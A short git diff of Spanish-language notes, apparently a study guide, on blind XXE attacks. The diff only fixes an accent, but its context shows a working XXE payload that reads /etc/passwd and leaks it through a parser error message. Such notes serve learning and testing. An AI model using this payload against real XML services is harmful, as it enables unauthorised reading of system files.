@@ -68,7 +68,7 @@ y donde sea vulnerable a XXE tenemos que poner esto :
 
 ## Exploiting blind XXE to retrieve data via error messages
 
-En este caso buscamos que el XML nos de un error y que en ese error este el contenido de /etc/passwd : 
+En este caso buscamos que el XML nos de un error y que en ese error esté el contenido de /etc/passwd : 
 
 ```
 <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>"> %eval; %error;
